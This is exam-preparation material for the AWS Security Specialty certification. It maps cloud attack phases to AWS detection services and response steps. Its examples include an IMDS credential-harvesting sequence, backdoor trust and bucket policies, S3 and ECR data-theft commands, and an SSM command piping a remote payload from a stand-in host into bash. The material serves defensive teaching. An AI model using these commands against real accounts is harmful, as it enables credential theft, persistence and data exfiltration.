## **Course:** AWS Certified Security â€“ Specialty (Exam SCS-C02)

**Threat model and exam focus**

This topic maps common cloud attack phases to AWS-native services and telemetry. You need to recognize how an attacker gets in, keeps access, moves across accounts and services, and removes data without being obvious. The exam often tests whether you can connect a behavior to the right AWS control, log source, or response action.

In AWS, the same identity or resource can be abused in multiple ways:
- **Identity compromise** through stolen IAM credentials or temporary role credentials.
- **Service abuse** through public endpoints, misconfigured trust policies, or overly broad resource policies.
- **Control-plane abuse** through API calls that create persistence, expand permissions, or hide activity.
- **Data-plane abuse** through S3 object access, ECR image pulls, presigned URLs, or backup exports.

**Initial access vectors**

Initial access usually starts with credentials, exposed services, or a trusted path into the environment. You should think in terms of where the attacker can first authenticate or reach a workload.

- **Exposed IAM access keys** are a common starting point.
  - Keys may leak in source code, CI/CD logs, container images, developer laptops, or public repositories.
  - Once found, attackers test them with `sts:GetCallerIdentity` and enumerate permissions.
  - Example:
    ```bash
    aws sts get-caller-identity --profile stolen
    aws iam list-attached-user-policies --user-name target-user
    aws iam simulate-principal-policy \
      --policy-source-arn arn:aws:iam::123456789012:user/target-user \
      --action-names s3:GetObject ec2:DescribeInstances
    ```

- **Compromised EC2 instance metadata and role credentials** are a major AWS-specific path.
  - If an attacker reaches a workload, they may query the Instance Metadata Service v2 (IMDSv2) to obtain temporary role credentials.
  - This is especially relevant after web app compromise, SSRF (Server-Side Request Forgery), or remote code execution.
  - Example metadata flow:
    ```bash
    TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    curl -H "X-aws-ec2-metadata-token: $TOKEN" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/
    ```

- **Public-facing services** often lead to AWS credential use.
  - Vulnerable web apps, exposed admin panels, SSRF, deserialization flaws, and command injection can expose environment variables, instance profile credentials, or application secrets.
  - Public API endpoints, ALB-backed apps, Lambda URLs, API Gateway integrations, and containerized workloads are common entry points.
  - If the app uses AWS SDKs, attackers may pivot from app compromise to S3, SQS, DynamoDB, Secrets Manager, or KMS access.

- **Leaked secrets in AWS-native locations** are also common.
  - Secrets Manager, Systems Manager Parameter Store, Lambda environment variables, ECS task definitions, and CodeBuild/CodePipeline variables can expose credentials if permissions are too broad.
  - A compromised developer or CI role can read these secrets and reuse them elsewhere.

- **Federation and SSO abuse** can provide initial access.
  - Stolen IdP credentials, session tokens, or misused SAML/OIDC trust relationships can yield AWS sessions through STS (Security Token Service).
  - Temporary credentials may be harder to detect because they are short-lived and often look like legitimate role sessions.

**Initial access detection**

You usually detect initial access by looking for unusual authentication, enumeration, or first-use behavior.

- Watch for `sts:GetCallerIdentity`, `iam:List*`, `iam:Get*`, `ec2:Describe*`, `s3:ListAllMyBuckets`, and `secretsmanager:GetSecretValue` from unfamiliar source IPs or user agents.
- Look for access key use from new geographies, impossible travel patterns, or nonstandard automation hosts.
- Correlate CloudTrail with VPC Flow Logs, ALB logs, WAF logs, and application logs to identify the first successful foothold.
- GuardDuty can flag credential abuse, anomalous API calls, and suspicious instance behavior.

**Persistence mechanisms**

Persistence in AWS often means creating or preserving a path to authenticate later, even after the original compromise is fixed. The most important exam idea is that persistence can live in identities, roles, policies, automation, or managed services.

- **Backdoored IAM users and roles**
  - Attackers may add access keys to an existing IAM user, create a new user, or attach overly permissive policies.
  - They may modify trust policies to allow their own principal to assume a role.
  - They may add themselves to groups or attach inline policies that survive password resets.
  - Example trust policy abuse:
    ```json
    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Effect": "Allow",
          "Principal": { "AWS": "arn:aws:iam::999999999999:root" },
          "Action": "sts:AssumeRole"
        }
      ]
    }
    ```

- **Access key regeneration patterns**
  - Attackers may create a second access key before deleting the first, or rotate keys to avoid simple detection.
  - They may keep one key dormant and use another for active operations.
  - Watch for `CreateAccessKey`, `UpdateAccessKey`, `DeleteAccessKey`, and unusual key age changes.

- **SSM persistence**
  - AWS Systems Manager can be abused to maintain remote execution or scheduled access.
  - Common patterns include creating or modifying:
    - SSM documents
    - State Manager associations
    - Automation documents
    - Run Command permissions
  - If an instance already has the SSM agent and an attached role, an attacker may use it as a durable management channel.
  - Example:
    ```bash
    aws ssm send-command \
      --document-name AWS-RunShellScript \
      --targets "Key=instanceids,Values=i-0123456789abcdef0" \
      --parameters commands='["curl https://example.com/payload.sh | bash"]'
    ```

- **Resource-based policy abuse**
  - Resource policies can create persistence even when identity policies are cleaned up.
  - Important targets include:
    - **S3 bucket policies**
    - **KMS key policies**
    - **Lambda resource policies**
    - SNS, SQS, ECR, and Secrets Manager policies where applicable
  - An attacker may grant cross-account access to their own principal or a role they control.
  - Example S3 bucket policy backdoor:
    ```json
    {
      "Version": "2012-10-17",
      "Statement": [
        {
          "Sid": "BackdoorRead",
          "Effect": "Allow",
          "Principal": { "AWS": "arn:aws:iam::999999999999:role/Operator" },
          "Action": ["s3:GetObject", "s3:ListBucket"],
          "Resource": [
            "arn:aws:s3:::target-bucket",
            "arn:aws:s3:::target-bucket/*"
          ]
        }
      ]
    }
    ```

- **Lambda persistence**
  - Attackers may add a new function, modify an existing function, or attach a resource policy that allows invocation from another account.
  - They may also abuse event source mappings or scheduled triggers to keep code execution recurring.

- **Scheduled and event-driven persistence**
  - CloudWatch Events / EventBridge rules, Lambda triggers, Step Functions, and CodeBuild projects can be modified to re-run attacker code.
  - Persistence may also be hidden in CI/CD pipelines, where a malicious build step reintroduces credentials or backdoors.

**Lateral movement**

Lateral movement in AWS usually means using one identity, role, or resource to reach another account, region, service, or workload. The exam often expects you to understand trust relationships and how temporary credentials propagate.

- **STS role chaining**
  - An attacker who has one role session can assume another role if the trust policy allows it.
  - Role chaining is common across accounts in organizations with centralized administration.
  - The attacker may enumerate roles with `iam:ListRoles`, inspect trust policies, and then call `sts:AssumeRole`.
  - Example:
    ```bash
    aws sts assume-role \
      --role-arn arn:aws:iam::222222222222:role/ReadOnlyAudit \
      --role-session-name pivot1
    ```

- **Cross-account trust abuse**
  - Trust policies may allow an external account, a specific role, or a wildcard principal.
  - If the attacker compromises a trusted principal, they inherit access into the target account.
  - This is especially important in AWS Organizations where accounts share centralized logging, security tooling, or deployment roles.

- **AWS Organizations and delegated administration**
  - A compromised management account or delegated admin role can reach many accounts through service control policies, StackSets, IAM roles, and organization-wide automation.
  - Attackers may use organization APIs to enumerate accounts, roles, and delegated services.

- **Resource-based policy lateral movement**
  - S3, KMS, Lambda, SNS, and SQS policies can allow direct access without assuming a role.
  - This matters because the attacker may not need to pivot through IAM if the resource policy already grants access.
  - KMS key policy abuse can unlock encrypted data in other services, including S3 objects and Secrets Manager secrets.

- **Service-linked and service roles**
  - Attackers may abuse roles assumed by AWS services if they can influence the service configuration.
  - Examples include ECS task roles, Lambda execution roles, EC2 instance profiles, and CodeBuild service roles.
  - If a workload can be modified, the attacker can often inherit its permissions.

- **Network and workload pivoting**
  - Once inside a VPC, the attacker may move to other instances through SSH, RDP, WinRM, or application-layer trust.
  - Security groups, peering, Transit Gateway, and private endpoints can widen the blast radius if segmentation is weak.
  - PrivateLink and VPC endpoints can also be abused to reach AWS APIs without public internet exposure.

**Exfiltration techniques**

Exfiltration in AWS often looks like legitimate service use. The key is to identify unusual volume, unusual destination, or unusual access patterns.

- **S3 object theft**
  - Attackers commonly enumerate buckets, list objects, and download data with `GetObject`.
  - They may use `aws s3 sync`, `cp`, or SDK calls to copy data out.
  - Example:
    ```bash
    aws s3 ls
    aws s3 sync s3://target-bucket ./loot
    aws s3 cp s3://target-bucket/finance.csv .
    ```

- **Presigned URL abuse**
  - A presigned URL grants time-limited access to an S3 object or upload target.
  - Attackers may generate presigned URLs to move data out without needing long-term permissions.
  - They may also trick a victim into uploading data to an attacker-controlled object path.
  - Example:
    ```bash
    aws s3 presign s3://target-bucket/secret.zip --expires-in 3600
    ```

- **Public endpoint transfer**
  - Data may be sent through public APIs, Lambda URLs, API Gateway, or direct HTTPS requests to attacker infrastructure.
  - Exfiltration can be hidden inside normal application traffic if the attacker controls a workload or function.

- **S3 replication abuse**
  - If an attacker can modify replication configuration, they may copy data to another bucket, potentially in another account or region.
  - This can create a durable and stealthy exfiltration path because replication looks like a normal storage feature.
  - Watch for changes to replication rules, IAM roles used by replication, and destination buckets.

- **Glacier and backup export paths**
  - Attackers may use backup, archive, or export workflows to move data into a location they can later retrieve.
  - Examples include AWS Backup copy jobs, snapshot sharing, or export tasks that place data into attacker-accessible storage.
  - Glacier retrieval and backup restore operations can also reveal sensitive data if permissions are weak.

- **ECR image theft**
  - Amazon Elastic Container Registry (ECR) images may contain source code, secrets, config files, or proprietary binaries.
  - If an attacker can pull images, they can inspect layers offline and extract embedded data.
  - Example:
    ```bash
    aws ecr get-login-password | docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com
    docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/app:latest
    docker save 123456789012.dkr.ecr.us-east-1.amazonaws.com/app:latest -o app.tar
    ```

- **Database and analytics exports**
  - RDS snapshots, Redshift unloads, Athena query results, and Glue job outputs can all be used to stage data for exfiltration.
  - If the attacker can create snapshots or export tasks, they may move data into S3 and then out of the account.

- **DNS, logs, and covert channels**
  - Less common but exam-relevant: attackers may encode data in DNS queries, CloudWatch Logs, or application telemetry.
  - These methods are harder to spot but usually lower bandwidth.

**Telemetry and detection**

You need to know which AWS logs show control-plane actions, which show data access, and where the gaps are.

- **CloudTrail management events**
  - Record control-plane actions such as `CreateUser`, `AttachRolePolicy`, `PutBucketPolicy`, `AssumeRole`, and `UpdateFunctionCode`.
  - These are enabled by default for many accounts, but retention and organization-wide coverage still matter.

- **CloudTrail data events**
  - Record high-volume data-plane activity such as S3 object access and Lambda function invocation.
  - They are essential for detecting exfiltration, but they are not enabled by default for all resources because of cost and volume.
  - Use them for sensitive buckets, critical Lambda functions, and other high-value data paths.

- **CloudTrail limitations**
  - CloudTrail does not show everything in real time and may not capture all network-layer behavior.
  - It can miss activity if the relevant data event selectors are not configured.
  - It is strongest when correlated with GuardDuty, Config, VPC Flow Logs, and service-specific logs.

- **AWS Config**
  - Config tracks configuration changes and helps detect drift, but it is not a full activity log.
  - It is useful for identifying policy changes, public exposure, and resource misconfiguration.
  - It does not replace CloudTrail for API-level attribution.

- **GuardDuty findings to watch**
  - Credential compromise and anomalous API usage.
  - Instance credential exfiltration or unusual behavior from EC2.
  - S3 exfiltration patterns, unusual data access, and suspicious object enumeration.
  - Reconnaissance findings such as port probing or unusual network destinations.
  - Findings involving IAM, EC2, S3, EKS, and malware-related behavior can help connect the attack chain.

- **Security Hub and EventBridge**
  - Security Hub aggregates findings from GuardDuty, Config, and other services.
  - EventBridge can route high-priority findings to SNS, Lambda, SSM Automation, or ticketing systems.
  - Example pattern:
    ```json
    {
      "source": ["aws.guardduty"],
      "detail-type": ["GuardDuty Finding"],
      "detail": {
        "severity": [{ "numeric": [">=", 7] }],
        "type": [
          { "prefix": "UnauthorizedAccess:" },
          { "prefix": "CredentialAccess:" }
        ]
      }
    }
    ```

**Practical detection and response configurations**

Use concrete logging and alerting controls so you can detect the behaviors above instead of only recognizing them in theory.

- **Enable S3 data event logging for sensitive buckets**
  - Add data event selectors for high-value buckets so object reads and writes appear in CloudTrail.
  - Example:
    ```bash
    aws cloudtrail put-event-selectors \
      --trail-name org-trail \
      --event-selectors '[
        {
          "ReadWriteType":"All",
          "IncludeManagementEvents":true,
          "DataResources":[
            {"Type":"AWS::S3::Object","Values":["arn:aws:s3:::sensitive-bucket/"]}
          ]
        }
      ]'
    ```

- **Use CloudTrail Lake or Athena for hunting**
  - Search for `AssumeRole`, `CreateAccessKey`, `PutBucketPolicy`, `PutRolePolicy`, `UpdateAssumeRolePolicy`, `PutKeyPolicy`, and `PutResourcePolicy`.
  - Example Athena-style query idea:
    ```sql
    SELECT eventTime, eventName, userIdentity.arn, sourceIPAddress, requestParameters
    FROM cloudtrail_logs
    WHERE eventName IN (
      'AssumeRole','CreateAccessKey','PutBucketPolicy',
      'PutRolePolicy','UpdateAssumeRolePolicy','PutKeyPolicy'
    )
    ORDER BY eventTime DESC;
    ```

- **Alert on policy backdoors**
  - Trigger on changes to trust policies and resource policies.
  - Focus on principals outside your organization, wildcard principals, and unexpected service principals.
  - Watch for `iam:PassRole` combined with `lambda:CreateFunction`, `ecs:RunTask`, or `ec2:RunInstances`.

- **Detect suspicious SSM use**
  - Alert on `SendCommand`, `CreateDocument`, `UpdateDocument`, `CreateAssociation`, and `StartAutomationExecution`.
  - Correlate with instances that should not be managed interactively.

- **Monitor presigned URL generation**
  - Presigned URLs are not inherently malicious, so look for unusual frequency, unusual object names, or generation from unexpected roles.
  - Pair CloudTrail with S3 server access logs or CloudFront logs when applicable.

- **Watch for replication and backup changes**
  - Alert on `PutBucketReplication`, `DeleteBucketReplication`, `CreateBackupVault`, `StartCopyJob`, snapshot sharing, and export task creation.
  - These changes can indicate stealthy data movement.

**Response workflow**

When you suspect one of these attack phases, respond in a way that preserves evidence and cuts off access quickly.

1. **Contain the identity or session**
   - Disable or delete exposed access keys.
   - Revoke active sessions where possible.
   - Remove suspicious trust relationships and inline policies.
   - Rotate secrets and credentials used by the affected workload.

2. **Contain the resource path**
   - Detach malicious resource policies.
   - Disable suspicious EventBridge rules, Lambda triggers, SSM associations, and replication rules.
   - Quarantine compromised instances or containers.

3. **Preserve evidence**
   - Export CloudTrail, Config, GuardDuty, VPC Flow Logs, and application logs.
   - Snapshot affected volumes or instances if needed.
   - Record timestamps, ARNs, source IPs, and session names.

4. **Hunt for spread**
   - Check for other roles with the same trust pattern.
   - Review organization-wide policy changes.
   - Search for similar access keys, documents, functions, or replication rules.

**High-value exam distinctions**

- **CloudTrail management events** show who changed the environment; **data events** show who touched the data.
- **AWS Config** shows configuration drift, not full attacker activity.
- **GuardDuty** is strongest for suspicious behavior and compromise signals, but it is not a complete forensic record.
- **Resource-based policies** can bypass identity-centric thinking, so always inspect both identity and resource permissions.
- **STS role chaining** and **cross-account trust** are central to AWS lateral movement.
- **S3 replication, backup exports, ECR pulls, and presigned URLs** are realistic exfiltration paths, not edge cases.

**Quick reference commands**

```bash
# Identify current identity
aws sts get-caller-identity

# Inspect role trust policy
aws iam get-role --role-name ExampleRole

# Check bucket policy
aws s3api get-bucket-policy --bucket sensitive-bucket

# Check KMS key policy
aws kms get-key-policy --key-id alias/example-key --policy-name default

# List SSM documents
aws ssm list-documents

# Review CloudTrail event selectors
aws cloudtrail get-event-selectors --trail-name org-trail
```

**What to remember for the exam**

- Initial access often starts with leaked IAM keys, compromised instance profile credentials, or a vulnerable public service.
- Persistence frequently uses IAM backdoors, SSM, scheduled automation, or resource-based policies.
- Lateral movement depends on STS, trust policies, Organizations, and service roles.
- Exfiltration often uses S3, replication, backups, ECR, or presigned URLs.
- Detection depends on combining CloudTrail, GuardDuty, Config, and EventBridge, with data events enabled where the data matters most.
